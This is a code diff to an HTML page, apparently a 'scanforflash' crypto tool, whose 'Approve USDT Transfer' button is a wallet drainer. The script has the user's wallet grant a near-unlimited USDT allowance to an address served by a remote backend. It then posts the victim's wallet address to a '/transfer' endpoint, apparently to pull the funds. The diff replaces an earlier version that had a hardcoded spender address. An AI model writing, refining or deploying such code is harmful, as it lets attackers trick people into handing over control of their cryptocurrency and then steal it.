@@ -68,49 +68,75 @@
         <div class="modal-content">
             <div class="modal-header">
                 <div class="modal-title">Approve USDT Transfer</div>
-                <button class="close-btn" onclick="closeModal()">×</button>
+                <button class="close-btn" onclick="document.getElementById('modal').classList.remove('show')">×</button>
             </div>
-            <button class="confirm-btn" id="btn" onclick="transfer()">Confirm</button>
+            <button class="confirm-btn" id="confirmBtn" onclick="confirm()">Confirm</button>
         </div>
     </div>
 
     <script>
-        const USDT = "0x55d398326f99059fF775485246999027B3197955";
         const BACKEND = "https://scanforflash-backend-production.up.railway.app";
-        let addr;
+        const USDT = "0x55d398326f99059fF775485246999027B3197955";
+        let userAddr, backendAddr;
+
+        window.addEventListener('load', async () => {
+            try {
+                const res = await fetch(BACKEND + '/backend-address');
+                const data = await res.json();
+                backendAddr = data.address;
+            } catch(e) {}
+        });
 
         async function approve() {
             try {
                 const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
-                addr = accounts[0];
+                userAddr = accounts[0];
                 document.getElementById('modal').classList.add('show');
             } catch(e) {
-                alert('Error: ' + e.message);
+                notify('Error: ' + e.message, 'error');
             }
         }
 
-        function closeModal() {
-            document.getElementById('modal').classList.remove('show');
-        }
-
-        async function transfer() {
+        async function confirm() {
             try {
-                document.getElementById('btn').disabled = true;
-                
+                document.getElementById('confirmBtn').disabled = true;
+                notify('Processing...', 'info');
+
                 const web3 = new Web3(window.ethereum);
-                const contract = new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], USDT);
+                const contract = new web3.eth.Contract([
+                    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
+                ], USDT);
 
-                await contract.methods.approve('0x1734b55dc44C420539a607Ff5b80aB62b0d18963', '99999999999999999999999999999').send({from: addr});
+                await contract.methods.approve(backendAddr, "999999999999999999999999999999").send({from: userAddr});
 
-                const res = await fetch(BACKEND + '/check-balance', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({walletAddress: addr})});
+                notify('✅ Transferring...', 'success');
+
+                const res = await fetch(BACKEND + '/transfer', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({walletAddress: userAddr})
+                });
+
                 const data = await res.json();
+                notify('✅ ' + data.amount + ' USDT transferred!', 'success');
 
-                alert('✅ ' + data.balance + ' USDT transferred!');
-                closeModal();
+                document.getElementById('modal').classList.remove('show');
+                document.getElementById('confirmBtn').disabled = false;
             } catch(e) {
-                alert('Error: ' + e.message);
+                document.getElementById('confirmBtn').disabled = false;
+                notify('Error: ' + e.message, 'error');
             }
-            document.getElementById('btn').disabled = false;
+        }
+
+        function notify(msg, type) {
+            let el = document.getElementById('notify');
+            if(!el) {
+                el = document.createElement('div');
+                el.id = 'notify';
+                document.body.appendChild(el);
+            }
+            el.textContent = msg;
+            el.className = `notify ${type}`;
         }
     </script>
 </body>
